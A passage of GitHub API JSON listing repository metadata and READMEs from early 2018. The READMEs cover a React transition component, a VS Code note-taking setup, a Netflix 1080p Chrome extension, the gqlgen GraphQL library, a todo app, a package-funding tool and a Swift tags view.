"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":30}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":39}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":34}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":12}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":15},"stargazers":{"totalCount":37}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":15}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":49}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":11},"stargazers":{"totalCount":78}}}],"totalCount":41},"websiteUrl":null},"repository":{"name":"freezus","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":2,"readme_md":{"text":"## freezus\n\n[work in progress]\n\n[ost](https://soundcloud.com/sahandii/cold-as-ice-remake)\n\n`yarn add freezus`\n\n```jsx\nimport Transition from 'freezus'\n\n// ...\n\n<Transition\n  id={key} // change this for every transition\n  onEnter={async id => ...}\n  onExit={async id => {\n    // do whatever!\n    // the previous render sticks around until this function exits\n    // and by magic, redux state is frozen inside it!\n    // local state and everything else works as expected\n\n    // you can now manually animate that old element out,\n    // do a shared element transition, whatever.\n    // use jquery for all I care\n    // refs are doubly useful here :)\n  }}>\n  <SomeContent/>\n</Transition>\n```\n\n## cancellation\n\ncallbacks also receive a function `cancelled` that tests whether a transition\nhas been cancelled. you can use this to synchronize stuff.\n\n```jsx\nonExit={async (id, cancelled) => {\n  await sleep(1000)\n  if(!cancelled()){\n    // do the thing\n  }\n  ...\n}}\n```\ntodo -\n\n* examples\n* tests\n* freeze react-router\n* freeze anything on context\n* `<ReactTransition` that matches the [popular one](https://reactcommunity.org/react-transition-group/), good for migrating\n","byteSize":1166},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":142},"createdAt":"2018-02-11T11:31:15Z","updatedAt":"2018-02-17T06:30:59Z","pushedAt":"2018-02-14T09:40:16Z","description":"magic component for transitions between screens","subscribersCount":{"totalCount":8},"diskUsage":111,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":16}}},"tags":{"totalCount":3},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"aviaryan","followers":{"totalCount":368},"repositories":{"totalCount":129},"following":{"totalCount":26},"location":"Gandhinagar, India","organizations":{"totalCount":9},"gists":{"edges":[{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":9},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":11},"stargazers":{"totalCount":20}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":63},"websiteUrl":"http://aviaryan.in"},"repository":{"name":"VSCodeNotebook","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":8,"readme_md":null,"readme_txt":null,"readme_markdown":{"text":"<h1 align=\"center\">\n\tVSCode Notebook :memo:\n</h1> \n\n**v1.0**\n\nVSCode Notebook is an attempt to use VSCode as a complete note taking application. \nThis is a VSCode port of the popular [SublimeNotebook](https://github.com/aviaryan/SublimeNotebook) project.\n\n<p align=\"center\">\n <img src=\"https://user-images.githubusercontent.com/4047597/36163471-86b2871c-110f-11e8-9030-d3788564a306.gif\">\n</p>\n\n\n## Why did you build this? :thinking:\n\nI have been note-taking for as long as I started using computers. I use notes mostly for technical stuff, but these days I am using notes to record all kinds of information like journals, ideas, snippets etc. In my career, I have tried a number of note-taking tools like OneNote, Evernote, CintaNotes, SimpleNote, Cherrytree, Google Keep, etc. But I have never been satisfied with them mainly because - \n\n1. I don't have any control over how or where my notes are stored. - What if the company closes or the developer stops building the product?\n2. Most of these services are paid or work on only certain Operating Systems. And even if they are truly free and cross-platform, they lack critical features like fast full notebook search or hierarchical organization.\n\nBecause of these reasons, I had to lose my notes a number of times and was forced to start from scratch. This was frustrating, and finally, I decided to do something about it.\n\nThe result is this project, a wrapper/idea that converts my text editor, VSCode, to a feature-rich note-taking tool. Sure it might not be as polished as all those premium note-taking tools, but it works and that too in the way I want it to. And if for some reason I get tired of using VSCode, I can always create a port for another text editor. It will be easy because the dependency on the text editor is very minimal here, not to mention the notes are nothing but plain text files. 😉\n\n\n## Features :sunglasses:\n\n* Fast Search across all notes\n* Hierarchical organization and display of notes\n* Password based encryption for notes\n* Cloud sync (Dropbox, Google Drive, Box, etc)\n* Periodic git backup (to Github, Gitlab, your own private git server, etc)\n* Markdown based markup and code syntax highlighting\n\n\n## Documentation :yum:\n\nRead [DOCUMENTATION.markdown](DOCUMENTATION.markdown).\n\n\n## Support the project :money_with_wings:\n\nAre you using this project regularly and find it adding value to your life?\n\nIf yes, please consider supporting the author by donating **$5**.\n\n[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.paypal.me/aviaryan/5)\n","byteSize":2567},"readme_tst":null,"readme_":null,"stars":{"totalCount":274},"createdAt":"2018-02-11T12:54:40Z","updatedAt":"2018-02-17T06:38:42Z","pushedAt":"2018-02-16T12:04:24Z","description":"📝 Use VS Code as a reliable note-taking/journal application","subscribersCount":{"totalCount":11},"diskUsage":28,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":18}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"user":{"login":"truedread","followers":{"totalCount":8},"repositories":{"totalCount":4},"following":{"totalCount":0},"location":"no","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"netflix-1080p","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":15,"readme_md":{"text":"# netflix-1080p\nChrome extension to play Netflix in 1080p\n\n# How it works\n\nThe core of Netflix playback lies in JavaScript: specifically its \"cadmium playercore\" JS. The way Netflix (poorly) enforces 1080p to only be played back on ChromeOS devices is through these lines of JavaScript:\n\n```javascript\na = /CrOS/.test(a.userAgent);\nthis.Fma = this.Aw = q.Gu.PV;\nthis.Qm = [x.$l.nV];\nthis.oo = [x.V.vA, x.V.wA];\na && this.oo.push(x.V.TH);\n```\n\nWhat it is doing is testing your User-agent for the \"CrOS\" string anywhere in it. If the search returns true, it appends the 1080p profile to the profile playback array (what this line `a && this.oo.push(x.V.TH);` is doing). If it returns false, it does nothing. The playback profile array is set up like so: `this.oo = [x.V.vA, x.V.wA];`, x.V.vA is the SD profile and x.V.wA is the 720p profile.\n\nAfter reading this you think the easy solution would be to just change the User-agent to make it contain the string \"CrOS\" right? Not that simple. ChromeOS apparently has a different DRM implementation than chrome, even though both use Widevine. I could never get it to work when I tried, Netflix always threw license errors. The next easiest thing to do is just delete the conditional to append 1080p and just make the 1080p profile apart of the regular profiles (`this.oo = [x.V.vA, x.V.wA];` -> `this.oo = [x.V.vA, x.V.wA, x.V.TH];`). This works perfectly.\n\nAll the Chrome extension has to do is redirect all requests to Netflix's playercore to the modified one it has in the root directory. That's it. A two line modification.\n\n# Why?\n\nWhy not.\n\n# Notes\n\nThis may raise your CPU usage since Netflix was never intended to be played back in 1080p on Chrome.\n\nMake sure to clear your browser cache, as the cached playercore will override the modified one and you will not be able to play 1080p.\n\nChrome Webstore link: https://chrome.google.com/webstore/detail/netflix-1080p/cankofcoohmbhfpcemhmaaeennfbnmgp\n","byteSize":1949},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":414},"createdAt":"2018-02-11T07:16:59Z","updatedAt":"2018-02-17T06:29:54Z","pushedAt":"2018-02-15T04:26:50Z","description":"Chrome extension to play Netflix in 1080p","subscribersCount":{"totalCount":17},"diskUsage":547,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":9}}},"tags":{"totalCount":3},"releases":{"totalCount":3},"type":"user"},"siteAdmin":"false"},{"user":{"login":"vektah","followers":{"totalCount":42},"repositories":{"totalCount":57},"following":{"totalCount":6},"location":"Melbourne, Australia","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":""},"repository":{"name":"gqlgen","primaryLanguage":{"name":"Go"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":15,"readme_md":{"text":"# gqlgen ![CircleCI](https://circleci.com/gh/vektah/gqlgen.svg?style=svg)\n\nThis is a library for quickly creating strictly typed graphql servers in golang.\n\n`dep ensure -add github.com/vektah/gqlgen`\n\nPlease use [dep](https://github.com/golang/dep) to pin your versions, the apis here should be considered unstable.\n\nIdeally you should version the binary used to generate the code, as well as the library itself. Version mismatches\nbetween the generated code and the runtime will be ugly. [gorunpkg](https://github.com/vektah/gorunpkg) makes this\nas easy as:\n\nGopkg.toml\n```toml\nrequired = [\"github.com/vektah/gqlgen\"]  \n```\n\nthen\n```go\n//go:generate gorunpkg github.com/vektah/gqlgen -out generated.go\n```\n\n#### Todo\n\n - [ ] opentracing\n - [ ] subscriptions\n\n### Try it\n\nDefine your schema first:\n```graphql schema\nschema {\n\tquery: Query\n\tmutation: Mutation\n}\n\ntype Query {\n\ttodos: [Todo!]!\n}\n\ntype Mutation {\n\tcreateTodo(text: String!): Todo!\n}\n\ntype Todo {\n\tid: ID!\n\ttext: String!\n\tdone: Boolean!\n\tuser: User!\n}\n\ntype User {\n    id: ID!\n    name: String!\n}\n```\n\nThen define your models:\n```go\npackage yourapp\n\ntype Todo struct {\n\tID     string\n\tText   string\n\tDone   bool\n\tUserID int\n}\n\ntype User struct {\n    ID string\t\n    Name string\n}\n```\n\nTell the generator how to map between the two in `types.json`\n```json\n{\n  \"Todo\": \"github.com/you/yourapp.Todo\",\n  \"User\": \"github.com/you/yourapp.User\"\n}\n```\n\nThen generate the runtime from it:\n```bash\ngqlgen -out generated.go\n```\n\nAt the top of the generated file will be an interface with the resolvers that are required to complete the graph:\n```go\npackage yourapp\n\ntype Resolvers interface {\n\tMutation_createTodo(ctx context.Context, text string) (Todo, error)\n\n\tQuery_todos(ctx context.Context) ([]Todo, error)\n\n\tTodo_user(ctx context.Context, it *Todo) (User, error)\n}\n```\n\nimplement this interface, then create a server with by passing it into the generated code:\n```go \nfunc main() {\n\thttp.Handle(\"/query\", graphql.Handler(gen.NewResolver(yourResolvers{})))\n\n\tlog.Fatal(http.ListenAndServe(\":8080\", nil))\n}\n```\n\n### Prior art\n\n#### neelance/graphql-go\n\nThe gold standard of graphql servers in golang. It provided the inspiration, and a good chunk of code for gqlgen. Its\nstrictly typed and uses your schema and some reflection to build up a resolver graph. The biggest downside is the amount\nof work building up all of the resolvers, wrapping every object manually.\n\nReasons to use gqlgen instead:\n - We bind directly to your types, you dont need to bind manually https://github.com/neelance/graphql-go/issues/28\n - We show you the interface required, no guess work https://github.com/neelance/graphql-go/issues/159\n - We use separate resolvers for query and mutation https://github.com/neelance/graphql-go/issues/145\n - Code generation makes nil pointer juggling explicit, fixing issues like https://github.com/neelance/graphql-go/issues/125 \n - Code generating makes binding issues obvious https://github.com/neelance/graphql-go/issues/33\n - Separating the resolvers from the data graph means we only need gofuncs around database calls, reducing the cost of https://github.com/neelance/graphql-go/pull/102 \n - arrays work just fine https://github.com/neelance/graphql-go/issues/144\n - first class dataloader support, see examples/dataloader\n\nhttps://github.com/neelance/graphql-go\n\n#### graphql-go/graphql\n\nWith this library you write the schema using its internal DSL as go code, and bind in all your resolvers. No go type\ninformation is used so you can dynamically define new schemas which could be useful for building schema stitching\nservers at runtime.\n\nReasons to use gqlgen instead:\n - strict types. Why go to all the effort of defining gql schemas and then bind it to interface{} everywhere?\n - first class dataloader support, see examples/dataloader\n - horrible runtime error messages when you mess up defining your schema https://github.com/graphql-go/graphql/issues/234\n - reviewing schema changes written in a go dsl is really hard across teams\n\nsee https://github.com/graphql-go/graphql\n\n#### Applifier/graphql-codegen and euforic/graphql-gen-go\n\nVery similar idea, take your schema and generate the code from it.\n\ngqlgen will build the entire execution environment statically, allowing go's type checker to validate everything across\nthe the graph. These two libraries generate resolvers that are loaded using reflection by the neelance library, so they\nhave most of the downsides of that with an added layer of complexity.\n\nsee https://github.com/Applifier/graphql-codegen and https://github.com/euforic/graphql-gen-go\n","byteSize":4592},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":661},"createdAt":"2018-02-11T04:54:11Z","updatedAt":"2018-02-17T06:28:51Z","pushedAt":"2018-02-17T07:38:36Z","description":"go generate based graphql server library","subscribersCount":{"totalCount":30},"diskUsage":921,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":8}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":353}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"tcodina","followers":{"totalCount":10},"repositories":{"totalCount":1},"following":{"totalCount":2},"location":"Germany","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"http://tcodina.com"},"repository":{"name":"todo-app","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":18,"readme_md":{"text":"# Todo App\nSimple ReactJs task manager 🔥\n\nTry it out [here](https://tcodina.com/exp/todo)\n\n---\n\n### Features\n\n- Create a task\n- Mark as completed\n- Delete a task\n- Data saved through local storage 📦 (thanks to @thomasvaeth)\n","byteSize":230},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":112},"createdAt":"2018-02-10T20:59:37Z","updatedAt":"2018-02-17T02:17:43Z","pushedAt":"2018-02-13T22:23:39Z","description":"Simple ReactJs todo app ✍","subscribersCount":{"totalCount":6},"diskUsage":96,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":4},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":19}}},"tags":{"totalCount":1},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"phildini","followers":{"totalCount":74},"repositories":{"totalCount":100},"following":{"totalCount":29},"location":"SF Bay Area","organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":33},"websiteUrl":"http://phildini.net"},"repository":{"name":"thanks","primaryLanguage":{"name":"Python"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":12,"readme_md":{"text":"# thanks\nFinding ways to fund the python packages you use. Inspired by [feross' thanks](https://github.com/feross/thanks).\n\nRun `thanks` on your requirements.txt to find ways to support the developers\nwho are supporting your code. 💚\n\n[![asciicast](https://asciinema.org/a/zftUjf4ZzhIJMEDkEenR1181m.png)](https://asciinema.org/a/zftUjf4ZzhIJMEDkEenR1181m)\n\n```\n$ pip install thanks\n$ thanks requirements.txt\n```\n\n## Contributing\n\nThe best way to contribute is to add info to `thanks/thanks.json` about\ncontributors, matching PyPI usernames to URLs.\n\nThe second best way is to add whatever you think will make this library more\nuseful. I will happily accept PRs for tests, better functionality, better output\nformatting, etc.\n","byteSize":727},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":128},"createdAt":"2018-02-10T15:10:12Z","updatedAt":"2018-02-16T09:45:40Z","pushedAt":"2018-02-13T23:19:41Z","description":"Finding ways to fund the packages you use.","subscribersCount":{"totalCount":3},"diskUsage":61,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":6},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":3},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":9},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":28}}},"tags":{"totalCount":8},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"pikachu987","followers":{"totalCount":43},"repositories":{"totalCount":40},"following":{"totalCount":20},"location":"Seoul, Korea","organizations":{"totalCount":1},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"Tags","primaryLanguage":{"name":"Swift"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":7,"readme_md":{"text":"# Tags\n\n[![Version](https://img.shields.io/cocoapods/v/Tags.svg?style=flat)](http://cocoapods.org/pods/Tags)\n[![License](https://img.shields.io/cocoapods/l/Tags.svg?style=flat)](http://cocoapods.org/pods/Tags)\n[![Platform](https://img.shields.io/cocoapods/p/Tags.svg?style=flat)](http://cocoapods.org/pods/Tags)\n[![Swift 4.0](https://img.shields.io/badge/Swift-4.0-orange.svg?style=flat)](https://developer.apple.com/swift/)\n\n## Introduce\n\ndynamically add, modify, and delete tags, and you can easily change the margins, colors, and fonts of your tags.\nTags are not broken because they are linked with Auto Layout.\nEach time the height of the tag changes, you can bring the height to the delegate\n\n\n![demo](./img/tag1.gif)\n![demo2](./img/tag2.gif)\n\n## Requirements\n\n`Tags` written in Swift 4. Compatible with iOS 8.0+\n\n## Installation\n\n### Cocoapods\n\nTags is available through [CocoaPods](http://cocoapods.org). To install\nit, simply add the following line to your Podfile:\n\n```ruby\npod 'Tags'\n```\n\n## Usage\n\n\n### Xib or Storyboard file\n\nsetting\n\n![image](./img/example1.png)\n\n![image](./img/example2.png)\n\nview\n\n![image](./img/example3.png) \n![image](./img/example4.png)\n\ndone!\n\n<br><br><br>\n\n### Code editor\n\n```swift\nimport Tags\n```\n\n```swift\nlet tagView = TagsView()\nself.view.addSubview(tagView)\n```\nAutoLayout Example\n\n```swift\ntagView.translatesAutoresizingMaskIntoConstraints = false\nself.view.addConstraint(NSLayoutConstraint(\n    item: self.view,\n    attribute: .leading,\n    relatedBy: .equal,\n    toItem: tagView,\n    attribute: .leading,\n    multiplier: 1,\n    constant: 0)\n)\nself.view.addConstraint(NSLayoutConstraint(\n    item: self.view,\n    attribute: .trailing,\n    relatedBy: .equal,\n    toItem: tagView,\n    attribute: .trailing,\n    multiplier: 1,\n    constant: 0)\n)\nself.view.addConstraint(NSLayoutConstraint(\n    item: self.view,\n    attribute: .top,\n    relatedBy: .equal,\n    toItem: tagView,\n    attribute: .top,\n    multiplier: 1,\n    constant: 